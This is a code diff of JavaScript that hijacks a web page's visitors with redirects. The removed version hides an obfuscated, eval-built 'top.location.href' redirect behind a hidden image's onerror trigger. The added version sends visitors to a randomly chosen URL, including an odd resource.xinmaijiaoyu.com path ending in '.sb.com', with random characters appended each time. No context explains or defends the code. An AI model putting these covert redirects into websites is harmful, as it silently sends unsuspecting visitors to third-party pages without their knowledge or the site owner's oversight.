@@ -1,26 +1,17 @@
-<script>
-//URL 
-var surl='https://www.baidu.com/';
-var x=function(){
-	return 'top.';
+var urls=[
+' https://resource.xinmaijiaoyu.com/user/2024043017554464955065.sb.com#{nnnnnnn}{wwww}',
+' https://baidu.com#{nnnnnnn}{wwww}',];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
 }
-var f=function(){
-	return 'loca';
-}
-var s=function(){
-	return 'tion.';
-}
-var e=function(){
-	return 'href';
-}
-var o=function(){
-	return '="';
-}
-function errorLoad(){
-	setTimeout(function(){
-		eval(x()+f()+s()+e()+o()+ surl  +'"');
-	},500);
-};
-</script>
-<!--通过图片加载错误触发JS跳转-->
-<img src="https://zz.baidu.com/load.gif" onerror="errorLoad();" style="display:none;">
